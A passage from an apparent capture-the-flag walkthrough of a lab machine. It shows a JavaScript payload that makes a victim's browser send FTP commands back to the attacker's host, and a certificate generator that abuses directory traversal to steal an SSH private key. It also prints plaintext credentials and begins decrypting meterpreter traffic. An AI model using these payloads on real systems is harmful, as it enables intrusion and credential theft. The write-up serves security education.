> Content-Length: 4                                              
> Connection: close                                              
> Referer: http://10.10.14.6/                                    
>                                                                
> USER anonymous       
> PASS                                                           
> " | nc 10.10.10.137 21                                       
220 vsFTPd 3.0.3+ (ext.1) ready...
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.             
530 Please login with USER and PASS. 
331 Please specify the password.                              
230 Login successful. 

```

It logs in!

#### Payload to List

The goal is to list build a payload that will list the files on the server. FTP is interesting, because in the default mode, when data is requested it connects back on a different port. This diagram is in [RFC-959](https://datatracker.ietf.org/doc/html/rfc959), which defines FTP:

![image-20230131212738257](https://0xdfimages.gitlab.io/img/image-20230131212738257.png)

This is actually useful to me. bob said that the firewall wasn’t yet preventing outbound connections. So if I can issue a command to tell it to connect back to me, I can get the data directly.

I’ll continue working on Luke so that I get feedback to build the payload I need. After sending the `USER` and `PASS` commands, then I’ll send the `PORT` command. Based on the RFC, I’ll send `PORT 10,10,14,6,223,1` to get a connection on 10.10.14.6:57089. The port number is a two byte integer, so I’ll multiple the high byte by 256 and add the low byte to get the port, for example 57089 = (223 \* 256) + 1. I’ll have to use a high port, or FTP will fail with a “500 Illegal PORT command.”. Adding that in and then a list, it works:

```

oxdf@hacky$ echo "POST / HTTP/1.1
> Host: 10.10.14.6:223
> User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
> Content-Type: text/plain;charset=UTF-8
> Content-Length: 4
> Connection: close
> Referer: http://10.10.14.6/
>
> USER anonymous
> PASS
> PASV
> PORT 10,10,14,6,223,1
> LIST
> " | nc 10.10.10.137 21
220 vsFTPd 3.0.3+ (ext.1) ready...
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.
331 Please specify the password.
230 Login successful.
227 Entering Passive Mode (10,10,10,137,182,55).
200 PORT command successful. Consider using PASV.
425 Failed to establish connection.

```

Well, it kind of works. It says “Failed to establish connection”. I’ll try again, but this time with `nc` listening on 57089. This time at the end it says:

```

150 Here comes the directory listing.
226 Directory send OK.

```

And at `nc`:

```

oxdf@hacky$ nc -lnvp 57089
Listening on 0.0.0.0 57089
Connection received on 10.10.10.137 20
drwxr-xr-x    2 0        0             512 Apr 14  2019 webapp

```

That’s a directory listing of this server.

#### Via Phish

I’ll update my `js.js` file with the new commands to execute this via bob on Response:

```

var x = new XMLHttpRequest();
x.open("POST", "http://172.18.0.4:2121", true);
x.send("USER ftp_user\r\nPASS Secret12345\r\nPORT 10,10,14,6,223,1\r\nLIST\r\n");

```

I’ll send my link to bob, and when he clicks:

```

oxdf@hacky$ nc -lnvp 57089
Listening on 0.0.0.0 57089
Connection received on 10.10.11.163 43956
-rw-r--r--    1 root     root            74 Mar 16  2022 creds.txt

```

There’s a file named `creds.txt`. I’ll replace the last `LIST\r\n` with `RETR creds.txt\r\n` (the command to get this file), and do it again. This time:

```

oxdf@hacky$ nc -lnvp 57089
Listening on 0.0.0.0 57089
Connection received on 10.10.11.163 44314
ftp
---
ftp_user / Secret12345

ssh
---
bob / F6uXVwEjdZ46fsbXDmQK7YPY3OM

```

### SSH

With these creds, I can SSH as bob:

```

oxdf@hacky$ sshpass -p F6uXVwEjdZ46fsbXDmQK7YPY3OM ssh bob@response.htb
...[snip]...
bob@response:~$

```

And read `user.txt`:

```

bob@response:~$ cat user.txt
9e0ab5ff************************

```

## Shell as scryh

### Enumeration

#### Filesystem

bob’s home directory is empty other than `user.txt` and some standard uninteresting config files.

There’s no `/var/www` directory, and the various webservers aren’t located on this host. Instead, they are running in Docker containers:

```

bob@response:/$ ps auxww | grep docker
root        1123  0.1  2.1 1997124 84832 ?       Ssl  Jan31   1:41 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        1611  0.0  0.1 1222988 4676 ?        Sl   Jan31   0:04 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 389 -container-ip 172.18.0.7 -container-port 389
root        2313  0.0  0.1 1222988 4836 ?        Sl   Jan31   0:05 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 -container-ip 172.18.0.10 -container-port 80
root        2318  0.0  0.0 1075140 3644 ?        Sl   Jan31   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 80 -container-ip 172.18.0.10 -container-port 80

```

There’s actually a bunch more containers running (these are just the ones that are proxied).

There’s one other user with a home directory in `/home`:

```

bob@response:/home$ ls
bob  scryh

```

Interestingly, bob can access it:

```

bob@response:/home/scryh$ ls -l
total 8
drwx------ 2 scryh scryh 4096 Mar 16  2022 incident_2022-3-042
drwxr-xr-x 5 scryh scryh 4096 Mar 17  2022 scan

```

There’s two directories. bob can’t access `incident_2022-3-042`, but can access `scan`:

```

bob@response:/home/scryh/scan$ ls -l
total 20
drwxr-xr-x 4 scryh scryh 4096 Mar  3  2022 data
drwxr-xr-x 2 scryh scryh 4096 Feb  1 14:06 output
-rwxr-xr-x 1 scryh scryh 3464 Mar  4  2022 scan.sh
drwxr-xr-x 2 scryh scryh 4096 Feb 15  2022 scripts
-rwxr-xr-x 1 scryh scryh 1252 Mar 17  2022 send_report.py

```

#### Processes

While doing analysis of the `scan` application, I noticed that the `log.txt` file was constantly changing:

![image-20230201154014162](https://0xdfimages.gitlab.io/img/image-20230201154014162.png)

![image-20230201154021295](https://0xdfimages.gitlab.io/img/image-20230201154021295.png)

![image-20230201154029788](https://0xdfimages.gitlab.io/img/image-20230201154029788.png)

It’s clear this is being run on a cron. I could upload [pspy](https://github.com/DominicBreuker/pspy) and watch, or just wait until it is changing and watch the process list:

```

bob@response:/home/scryh/scan$ ps auxww | grep scan.sh
root      123895  0.0  0.0   2608   536 ?        Ss   20:41   0:00 /bin/sh -c /root/ldap/scan.sh
root      123896  0.0  0.0   6892  3236 ?        S    20:41   0:00 /bin/bash /root/ldap/scan.sh
root      123897  0.0  0.1   9484  4632 ?        S    20:41   0:00 sudo -u scryh bash -c cd /home/scryh/scan;./scan.sh
scryh     123898  0.0  0.0   6892  3144 ?        S    20:41   0:00 bash -c cd /home/scryh/scan;./scan.sh
scryh     123899  0.0  0.0   6892  3228 ?        S    20:41   0:00 /bin/bash ./scan.sh
bob       123909  0.0  0.0   6432   720 pts/2    S+   20:41   0:00 grep --color=auto scan.sh

```

This looks like a root cron running `/root/ldap/scan.sh` that then runs `scan.sh` as scryh.

### scan Analysis

#### scan.sh

The starting point for this application is `scan.sh`. It’s a relatively long Bash script. Since I have SSH access to the box, I’ll use VSCode with Response as a remote host (I show setting that up on a HackTheBox machine in [this video](https://www.youtube.com/watch?v=EfLW51f6KFo&t=109s)).

The first thing the script does is define a function `isEmailValid`:

```

function isEmailValid() {
  regex="^(([A-Za-z0-9]+((\.|\-|\_|\+)?[A-Za-z0-9]?)*[A-Za-z0-9]+)|[A-Za-z0-9]+)@(([A-Za-z0-9]+)+((\.|\-|\_)?([A-Za-z0-9]+)+)*)+\.([A-Za-z]{2,})+$"
  [[ "${1}" =~ $regex ]]
}

```

This is just applying a regular expression and returning if it matches as true or false.

Next it has hardcoded LDAP creds:

```

bind_dn='cn=admin,dc=response,dc=htb'
pwd='aU4EZxEAOnimLNzk3'

```

Then it creates a fresh log file in the `output` directory, and then updates the `umask` so that everything else created after that is only readable by the user that created it:

```

# clear output folder, set umask
rm output/scan_*
log_file='output/log.txt'
rm $log_file
touch $log_file
umask 0006

```

Next is gets a list of servers from LDAP and starts a loop over them if the IP is valid:

```

# get customer's servers from LDAP
servers=$(/usr/bin/ldapsearch -x -D $bind_dn -w $pwd -s sub -b 'ou=servers,dc=response,dc=htb' '(objectclass=ipHost)'|grep ipHostNumber|cut -d ' ' -f2)
for ip in $servers; do
  if [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "scanning server ip $ip" >> $log_file

```

I can run this command and see it returns one host, TestServer:

```

bob@response:~$ bind_dn='cn=admin,dc=response,dc=htb'
bob@response:~$ pwd='aU4EZxEAOnimLNzk3'
bob@response:~$ ldapsearch -x -D $bind_dn -w $pwd -s sub -b 'ou=servers,dc=response,dc=htb' '(objectclass=ipHost)'
# extended LDIF
#
# LDAPv3
# base <ou=servers,dc=response,dc=htb> with scope subtree
# filter: (objectclass=ipHost)
# requesting: ALL
#

# TestServer, servers, response.htb
dn: cn=TestServer,ou=servers,dc=response,dc=htb
objectClass: top
objectClass: ipHost
objectClass: device
cn: TestServer
manager: uid=marie,ou=customers,dc=response,dc=htb
ipHostNumber: 172.18.0.5

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

Running that with the `grep` returns the IP:

```

bob@response:~$ ldapsearch -x -D $bind_dn -w $pwd -s sub -b 'ou=servers,dc=response,dc=htb' '(objectclass=ipHost)'|grep ipHostNumber|cut -d ' ' -f2
172.18.0.5

```

The IP is then scanned with `nmap` on HTTPS using three scripts in the `scripts` folder, and the results are used to generate a PDF report:

```

    # scan customer server and generate PDF report
    outfile="output/scan_$ip"
    nmap -v -Pn $ip -p 443 --script scripts/ssl-enum-ciphers,scripts/ssl-cert,scripts/ssl-heartbleed -oX "$outfile.xml"
    wkhtmltopdf "$outfile.xml" "$outfile.pdf"

```

Now it tries to get the manager for the server, exiting if it’s not found, and then the email for that user:

```

    # get customer server manager
    manager_uid=$(/usr/bin/ldapsearch -x -D $bind_dn -w $pwd -s sub -b 'ou=servers,dc=response,dc=htb' '(&(objectclass=ipHost)(ipHostNumber='$ip'))'|grep 'manager: uid='|cut -d '=' -f2|cut -d ',' -f1)
    if [[ "$manager_uid" =~ ^[a-zA-Z0-9]+$ ]]; then
      echo "- retrieved manager uid: $manager_uid" >> $log_file
      
      # get manager's mail address
      mail=$(/usr/bin/ldapsearch -x -D "cn=admin,dc=response,dc=htb" -w aU4EZxEAOnimLNzk3 -s sub -b 'ou=customers,dc=response,dc=htb' '(uid='$manager_uid')'|grep 'mail: '|cut -d ' ' -f2)
      if isEmailValid "$mail"; then
        echo "- manager mail address: $mail" >> $log_file

```

Next it attempts to find the email server hostname associated with the domain in the email address:

```

        # get SMTP server
        domain=$(echo $mail|cut -d '@' -f2)
        local_dns=true
        smtp_server=$(nslookup -type=mx "$domain"|grep 'mail exchanger'|cut -d '=' -f2|sort|head -n1|cut -d ' ' -f3)
        if [[ -z "$smtp_server" ]]; then
          echo "- failed to retrieve SMTP server for domain \"$domain\" locally" >> $log_file

          # SMTP server not found. try to query customer server via DNS
          local_dns=false
          smtp_server=$(timeout 0.5 nslookup -type=mx "$domain" "$ip"|grep 'mail exchanger'|cut -d '=' -f2|sort|head -n1|cut -d ' ' -f3)
          if [[ -z "$smtp_server" ]]; then
            echo "- failed to retrieve SMTP server for domain \"$domain\" from server $ip" >> $log_file

            # failed to retrieve SMTP server
            continue
          fi
        fi

```

The first query is to the local DNS server, but if that fails, it will try using the IP of the scanned server itself as a DNS to make the same request. For example, with the server that’s currently in LDAP, `response-test.htb`, the `nslookup` with no specified host fails, but the one to the IP of `response-test.htb` works:

```

bob@response:/home/scryh/scan$ nslookup -type=mx response-test.htb 172.18.0.5
Server:         172.18.0.5
Address:        172.18.0.5#53

response-test.htb       mail exchanger = 10 mail.response-test.htb.

```

Now it wants to translate that domain into an IP:

```

        if [[ "$smtp_server" =~ ^[a-z0-9.-]+$ ]]; then
          echo "- retrieved SMTP server for domain \"$domain\": $smtp_server" >> $log_file

          # retrieve ip address of SMTP server
          if $local_dns; then
            smtp_server_ip=$(nslookup "$smtp_server"|grep 'Name:' -A2|grep 'Address:'|head -n1|cut -d ' ' -f2)
          else
            smtp_server_ip=$(nslookup "$smtp_server" "$ip"|grep 'Name:' -A2|grep 'Address:'|head -n1|cut -d ' ' -f2)
          fi

```

Finally, if it got an IP, it calls `send_report.py`:

```

          if [[ "$smtp_server_ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo "- retrieved ip address of SMTP server: $smtp_server_ip" >> $log_file

            # send PDF report via SMTP
            ./send_report.py "$smtp_server_ip" "$mail" "$outfile.pdf" >> $log_file
          fi

```

#### send\_report.py

This script is much more straight forward, doing exactly what it says it does:

```

#!/usr/bin/env python3

import sys
import smtplib
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate

def send_report(smtp_server, customer_email, fn):
  msg = MIMEMultipart()
  msg['From']    = 'reports@response.htb'
  msg['To']      = customer_email
  msg['Date']    = formatdate(localtime=True)
  msg['Subject'] = 'Response Scanning Engine Report'
  msg.attach(MIMEText('Dear Customer,\n\nthe attached file contains your detailed scanning report.\n\nBest regards,\nYour Response Scanning Team\n'))
  pdf = open(fn, 'rb').read()
  part = MIMEApplication(pdf, Name='Scanning_Report.pdf')
  part['Content-Disposition'] = 'attachment; filename="Scanning_Report.pdf"'
  msg.attach(part)
  smtp = smtplib.SMTP(smtp_server)
  smtp.sendmail(msg['From'], customer_email, msg.as_string())
  smtp.close()

def main():
  if (len(sys.argv) != 4):
    print('usage:\n%s <smtp_server> <customer_email> <report_file>' % sys.argv[0])
    quit()

  print('- sending report %s to customer %s via SMTP server %s' % ( sys.argv[3], sys.argv[2], sys.argv[1]))
  send_report(sys.argv[1], sys.argv[2], sys.argv[3])

if (__name__ == '__main__'):
  main()

```

Nothing much of interest here.

#### scripts

The scripts in the `scripts` folder are three `nmap` scripts that on first glance look like default `nmap` scripts. The default `nmap` scripts are typically stored in `/usr/share/nmap/scripts`. I can compare those to the ones in the local directory:

![image-20230201151728970](https://0xdfimages.gitlab.io/img/image-20230201151728970.png)

I’ve colored the results to show that two match, but the `ssl-cert.nse` script is different. `diff` shows extra capability added to the one used in `scan`:

```

bob@response:/home/scryh/scan$ diff scripts/ssl-cert.nse /usr/share/nmap/scripts/ssl-cert.nse 
232,257d231
< local function read_file(fn)
<   local f = io.open(fn, 'r')
<   local content = ''
<   if f ~= nil then
<     content = f:read('*all')
<     f:close()
<   end
<   return content
< end
< 
< local function get_countryName(subject)
<   countryName = read_file('data/countryName/' .. subject['countryName'])
<   if (countryName == '') then
<     return 'UNKNOWN'
<   end
<   return countryName
< end
< 
< local function get_stateOrProvinceName(subject)
<   stateOrProvinceName = read_file('data/stateOrProvinceName/' .. subject['stateOrProvinceName'])
<   if (stateOrProvinceName == '') then
<     return 'NO DETAILS AVAILABLE'
<   end
<   return stateOrProvinceName
< end
< 
262,263d235
<   lines[#lines + 1] = "Full countryName: " .. get_countryName(cert.subject)
<   lines[#lines + 1] = "stateOrProvinceName Details: " .. get_stateOrProvinceName(cert.subject)
308a281,283

```

It’s adding extra lines to the report which use the `cert.subject` to look up information about the state/province and country code based on a bunch of files in the `data` directory. For example:

```

bob@response:/home/scryh/scan$ cat data/stateOrProvinceName/Texas 
Texas is a state in the South Central region of the United States.
bob@response:/home/scryh/scan$ cat data/countryName/US 
United States

```

I’ll note that there is a directory traversal bug in the way it is appending the `subject` to build a file path, which I’ll come back to later.

#### Summary

This diagram summarizes the scan process:

![](https://0xdfimages.gitlab.io/img/ResponseScan.png)

At this point, I can control what comes back for 1 and 3, and if I point it to a host I control, I can control 2 and 4 as well, including where the report is sent in 6.

### Scan HTTPS Server

#### Update LDAP

The first thing to do here is get `scan` to scan my host. To do that, I’ll use the LDAP creds from the script to add a server to the `servers` organizational unit that has the IP of my host. I’ll make another `.ldif` file, starting with the output of the command I showed above, and changing the name and IP:

```

dn: cn=0xdfserver,ou=servers,dc=response,dc=htb
objectClass: top
objectClass: ipHost
objectClass: device
cn: 0xdfserver
manager: uid=marie,ou=customers,dc=response,dc=htb
ipHostNumber: 10.10.14.6

```

I’ll leave marie as the manager for now. I may want to change that later. I’ll copy this to Response using `scp`:

```

sshpass -p F6uXVwEjdZ46fsbXDmQK7YPY3OM scp server.ldif bob@response.htb:/tmp/

```

The next time the minute rolls around, there’s an attempt to connect to my host on TCP 443:

![image-20230201161038480](https://0xdfimages.gitlab.io/img/image-20230201161038480.png)

My host responds with a RST because I don’t yet have anything listening on 443.

It’s worth nothing that the LDAP seems to get reset after each scan, so I’ll want to keep my LDAP add commands handy.

#### HTTPS Server

To create a simple HTTPS server, I’ll use Python. [This blog](https://blog.anvileight.com/posts/simple-python-http-server/#python-3-x-1) has a nice reference for how to create one, using this code snippet, which I’ll update changing the port to 443, the host to all interfaces, and the path to the certificate and key to in the same directory:

```

from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)

httpd.socket = ssl.wrap_socket (httpd.socket,
        keyfile="./key.pem",
        certfile='./cert.pem', server_side=True)

httpd.serve_forever()

```

I’ll need a key and certificate. I’ll let ChatGPT tell me how:

![image-20230201161723744](https://0xdfimages.gitlab.io/img/image-20230201161723744.png)

I’ll run this, accepting all the defaults:

```

oxdf@hacky$ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
Generating a RSA private key
..................................................................................................+++++
.................................................................................................................................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

```

I’ll run the python script, and after a minute there’s a connection and a crash:

```

oxdf@hacky$ python https.py 
----------------------------------------
Exception happened during processing of request from ('10.10.11.163', 36260)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 316, in _handle_request_noblock
...[snip]...

```

`nmap` does some really non-standard stuff while scanning. It’s ok though - watching in Wireshark shows a ton of activity (filtered to only show `tcp.port == 443`):

![image-20230201163209412](https://0xdfimages.gitlab.io/img/image-20230201163209412.png)

There’s scan results for 10.10.14.6 in the `output` directory:

```

bob@response:/home/scryh/scan$ ls output/
log.txt  scan_10.10.14.6.pdf  scan_10.10.14.6.xml  scan_172.18.0.5.pdf  scan_172.18.0.5.xml

```

And the log shows a successful scan:

```

scanning server ip 172.18.0.5
- retrieved manager uid: marie
- manager mail address: marie.w@response-test.htb
- failed to retrieve SMTP server for domain "response-test.htb" locally
- retrieved SMTP server for domain "response-test.htb": mail.response-test.htb.
- retrieved ip address of SMTP server: 172.18.0.5
- sending report output/scan_172.18.0.5.pdf to customer marie.w@response-test.htb via SMTP server 172.18.0.5
scanning server ip 10.10.14.6
- retrieved manager uid: marie
- manager mail address: marie.w@response-test.htb
- failed to retrieve SMTP server for domain "response-test.htb" locally
- failed to retrieve SMTP server for domain "response-test.htb" from server 10.10.14.6

```

### Receive Report Email

#### DNS Server

I’ll note that it says it tried to query the domain `response-test.htb` from 10.10.14.6. My Wireshark capture confirms that:

![image-20230201163433392](https://0xdfimages.gitlab.io/img/image-20230201163433392.png)

My Ubuntu system is already running `dnsmasq` by default, but it’s easy to install if you’re on a different OS. In `/etc/dnsmasq.conf`, I’ll make a few changes.

By default, it only listens on localhost. I’ll uncomment the line that defines the `listen-address` and add my VPN IP:

```

listen-address=127.0.0.1,10.10.14.6

```

I’ll want to turn this back off once I’m done.

I’ll create a new file in `/etc/dnsmasq.d` called `response.htb` and add the records I want in there:

```

address=/.0xdf.htb/10.10.14.6
mx-host=response-test.htb,0xdf.htb,0

```

This will create an MX record saying that the mail server for `response-test.htb` is `0xdf.htb`, and then a A record saying that the IP for `0xdf.htb` is 10.10.14.6.

The next time the report runs after adding the server back into LDAP, there are several DNS queries:

![image-20230201170512931](https://0xdfimages.gitlab.io/img/image-20230201170512931.png)

#### SMTP Server

If I check that same PCAP after it tells Response that the mail server is at 10.10.14.6, there’s a failed attempt to connect to my host on TCP 25:

![image-20230201170802610](https://0xdfimages.gitlab.io/img/image-20230201170802610.png)

Because I’m not listening on 25, it returns a RST to the SYN.

Luckily for me, Python has a built in SMTP server that’s almost as simple as the webserver. I’ll run it, and after adding my server back to LDAP and waiting, the email arrives:

```

oxdf@hacky$ python -m smtpd -n -c DebuggingServer 10.10.14.6:25                                    
---------- MESSAGE FOLLOWS ----------
b'Content-Type: multipart/mixed; boundary="===============5273978883267221423=="'
b'MIME-Version: 1.0'
b'From: reports@response.htb'
b'To: marie.w@response-test.htb'
b'Date: Wed, 01 Feb 2023 22:10:13 +0000'
b'Subject: Response Scanning Engine Report'
b'X-Peer: 10.10.11.163'
b''                                                 
b'--===============5273978883267221423=='
b'Content-Type: text/plain; charset="us-ascii"'
b'MIME-Version: 1.0'                                
b'Content-Transfer-Encoding: 7bit'
b''                                                 
b'Dear Customer,'                                   
b''                                                 
b'the attached file contains your detailed scanning report.'
b''                                                 
b'Best regards,'                                    
b'Your Response Scanning Team'                      
b''                                                 
b'--===============5273978883267221423=='
b'Content-Type: application/octet-stream; Name="Scanning_Report.pdf"'
b'MIME-Version: 1.0'                                
b'Content-Transfer-Encoding: base64'
b'Content-Disposition: attachment; filename="Scanning_Report.pdf"'
b''                                                 
b'JVBERi0xLjQKJcOiw6MKMSAwIG9iago8PAovVGl0bGUgKCkKL0NyZWF0b3IgKP7/AHcAawBoAHQA'
b'bQBsAHQAbwBwAGQAZgAgADAALgAxADIALgA1KQovUHJvZHVjZXIgKP7/AFEAdAAgADUALgAxADIA'
b'LgA4KQovQ3JlYXRpb25EYXRlIChEOjIwMjMwMjAxMjIxMDExWikKPj4KZW5kb2JqCjIgMCBvYmoK'
b'PDwKL1R5cGUgL0NhdGFsb2cKL1BhZ2VzIDMgMCBSCj4+CmVuZG9iago0IDAgb2JqCjw8Ci9UeXBl'
...[snip]...

```

I can grab the base64 encoded stuff at the end and save it to a file, and then decode it to get a PDF:

```

oxdf@hacky$ cat attach.pdf.b64 | base64 -d > attach.pdf
oxdf@hacky$ file attach.pdf
attach.pdf: PDF document, version 1.4

```

I had some issues with the terminal output cutting off the end of the attachment base64. I’ll end up still using this one-liner to be the SMTP server, but going into Wireshark to get the full base64 of the attachment. Once I got that working, I’ve got a scan output of my host:

![image-20230201221217985](https://0xdfimages.gitlab.io/img/image-20230201221217985.png)

### Directory Traversal / File Read

I noted above that the modified `nmap` script for certificate parsing had a directory traversal vulnerability in it here:

```

local function get_stateOrProvinceName(subject)
  stateOrProvinceName = read_file('data/stateOrProvinceName/' .. subject['stateOrProvinceName'])
  if (stateOrProvinceName == '') then
    return 'NO DETAILS AVAILABLE'
  end
  return stateOrProvinceName
end

```

There’s one in the country code as well (though either impossible or much harder to exploit, as the country code is only two characters - I’m not sure if it’s possible for a certificate to have more than two, but the tools I use to generate them won’t take more than two).

As I control the server being scanned, I can update certificate to try to exploit this. I’ll write a simple Bash script to generate certificates based on a target file name:

```

#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "usage: $0 [target file name]"
    exit
fi

target=${1//\//\\\/}
out=${1//\//_}

openssl req -x509 -newkey rsa:2048 -keyout www/key_${out}.pem -out www/cert_${out}.pem -days 365 -nodes -subj "/C=US/ST=..\/..\/..\/..\/..\/${target}/O=0xdf Inc/OU=hacking"

```

`$target` is set to be the first argument, but escaping all the `/`. `$out` is set to the first argument, but replacing `/` with `_`. Then it makes the same call to `openssl req` as above, but putting the directory traversal payload in as the `stateOrProvinceName`.

I’ll run this, update my Python HTTPS server to use the new key and certificate, and then add my server in LDAP. On the next scan, I’ll get the email, decode the PDF, and it worked:

![image-20230202064541364](https://0xdfimages.gitlab.io/img/image-20230202064541364.png)

### SSH

I already noticed that this scanner is running as scryh. I’ll try to read their private SSH key:

```

oxdf@hacky$ ./gen_tls.sh /home/scryh/.ssh/id_rsa
Generating a RSA private key
.................................................+++++
.........+++++
writing new private key to 'www/key__home_scryh_.ssh_id_rsa.pem'
-----

```

After updating the HTTPS server and triggering the scan, the attachment has the key:

![image-20230202065710117](https://0xdfimages.gitlab.io/img/image-20230202065710117.png)

I’ll save that to a file and get SSH access as scryh:

```

oxdf@hacky$ vim ~/keys/response-scryh
oxdf@hacky$ chmod 600 ~/keys/response-scryh
oxdf@hacky$ ssh -i ~/keys/response-scryh scryh@response.htb
...[snip]...
scryh@response:~$

```

## Shell as root

### Enumeration

#### incident\_2020-3-042

As scryh, I get access to the `incident_2020-3-042` folder. It has three files:

```

scryh@response:~/incident_2022-3-042$ file *
core.auto_update: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from './auto_update', real uid: 0, effective uid: 0, real gid: 0, effective gid: 0, execfn: './auto_update', platform: 'x86_64'
dump.pcap:        pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
IR_report.pdf:    PDF document, version 1.4

```

It’s a core dump, a PCAP, and a PDF. I’ll grab all three with `scp`:

```

oxdf@hacky$ scp -i ~/keys/response-scryh scryh@response.htb:~/incident_2022-3-042/* .
core.auto_update                   100% 2754KB   3.7MB/s   00:00    
dump.pcap                          100% 2939KB   9.9MB/s   00:00    
IR_report.pdf                      100%   25KB 285.1KB/s   00:00 

```

`IR_report.pdf` is a single page summary of an incident:

[![image-20230202104920855](https://0xdfimages.gitlab.io/img/image-20230202104920855.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20230202104920855.png)

It looks like someone got access to the chat application (like I did) and got admin to download a link and execute a meterpreter payload, exfiling a zip archive. The core dump will have the memory of the malware before it was killed, and the PCAP will have the network traffic.

It seems very clear that I need to look into this.

#### dump.pcap

The PCAP file paints a clear picture of how the attack went down, showing someone following the exact path that I took into the chat application. There are many connections to `/status/main.js.php` with cookies that show the attacker is getting a digest for a URL:

![image-20230202150228361](https://0xdfimages.gitlab.io/img/image-20230202150228361.png)

Then POSTs to `/fetch` on `proxy.response.htb` to get that page:

![image-20230202150330884](https://0xdfimages.gitlab.io/img/image-20230202150330884.png)

The PCAP must be captured somewhere that also sees the request from `proxy.response.htb` to `chat.response.htb`, as I get those in clear text as well. For example, there’s a POST to `/fetch` with a POST to `chat` to login:

![image-20230202150534342](https://0xdfimages.gitlab.io/img/image-20230202150534342.png)

That `body` decodes to:

```

40{"username":"b0b","password":"noneed","authserver":"10.10.13.42"}

```

Also get that in the clear from 172.18.10 (`proxy`) to 172.18.0.8 (`chat`):

![image-20230202151002584](https://0xdfimages.gitlab.io/img/image-20230202151002584.png)

The attacker connects as b0b, and once inside the chat, makes a request to admin:

![image-20230202151055399](https://0xdfimages.gitlab.io/img/image-20230202151055399.png)

The admin says agrees:

![image-20230202151416004](https://0xdfimages.gitlab.io/img/image-20230202151416004.png)

Then (in TCP stream 96) an ELF is fetched from the attacker at `/auto_update`:

![image-20230202151326780](https://0xdfimages.gitlab.io/img/image-20230202151326780.png)

The next stream (97) is a connection back to the attacker on 4444, and the connection looks to be encrypted.

#### Binary Analysis

I’ll download a copy of the ELF from Wireshark by going to “Export Objects” > “HTTP…”:

![image-20230202151927533](https://0xdfimages.gitlab.io/img/image-20230202151927533.png)

There’s a lot, but I can filter on `auto` and the one file is left:

![image-20230202152027859](https://0xdfimages.gitlab.io/img/image-20230202152027859.png)

I’ll Save it, and it’s a 64-bit ELF:

```

oxdf@hacky$ file auto_update 
auto_update: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, with debug_info, not stripped

```

Running `strings -n 10 auto_update` produces some interesting stuff:

![image-20230202152250651](https://0xdfimages.gitlab.io/img/image-20230202152250651.png)

The help menu is interesting, but so is the term “mettle” that shows up a few times. [Mettle](https://github.com/rapid7/mettle) is a part of Meterpreter, specifically:

> This is an implementation of a native-code Meterpreter, designed for portability, embeddability, and low resource utilization. It can run on the smallest embedded Linux targets to big iron, and targets Android, iOS, macOS, Linux, and Windows, but can be ported to almost any POSIX-compliant environment.

A search of the hash in [VirusTotal](https://www.virustotal.com/gui/file/aff947cea72ab6296416080041753af79fa0684e3621281f537ce5f046db39d3) shows this has been uploaded, and the signatures say it’s Meterpreter:

![image-20230202152559865](https://0xdfimages.gitlab.io/img/image-20230202152559865.png)

### Meterpreter Traffic Decryption

#### Meterpreter Packet Structure

I’m able to find a few sources talking about the protocol that meterpreter uses on the wire. It is kind of a [type-length-value](https://en.wikipedia.org/wiki/Type%E2%80%93length%E2%80%93value) protocol (actually more like a LTV), although there’s a header and if the packet is encrypted, there’s also an IV.
- [This pull request](https://github.com/rapid7/metasploit-framework/pull/8625) talks about a change to the protocol in 2017, with some nice descriptions of the “new” (current) version.
- [This documentation from Rapid7](https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Packet) shows the packet object and it’s fields.

Each packet starts with a four byte XOR key that is applied to the rest of the packet. The rest of the header is a session GUID, an encryption flag, the packet length, and the packet type:

![image-20230202154904655](https://0xdfimages.gitlab.io/img/image-20230202154904655.png)

The packet length is the length from starting at the length to the end.

Then if the packet is not encrypted, the TLV packets start. If it is encrypted, there’s a 16 byte AES IV for the remaining packet, and once that’s decrypted, the result is TLV packets.

#### Video

I’ll go through the process of making this script in [this video](https://www.youtube.com/watch?v=-RlZCTYcgvk):

#### Parse Outer Packet

I’ll use `tshark` to pull the meterpreter TCP stream into it’s own file, `msf.pcap`:

```

oxdf@hacky$ tshark -q -r dump.pcap -Y tcp.stream==97 -w msf.pcap

```

Now I’ll use Python / Scapy to parse the pcap. I want to think in terms of a stream of data, rather than packets, so I’ll start by just getting all the data into one stream. There’s some risk here that I’m combining traffic from both the attacker and the victim, but it will work out ok.

```

# pull all bytes into a stream
pcap = rdpcap("./msf.pcap")
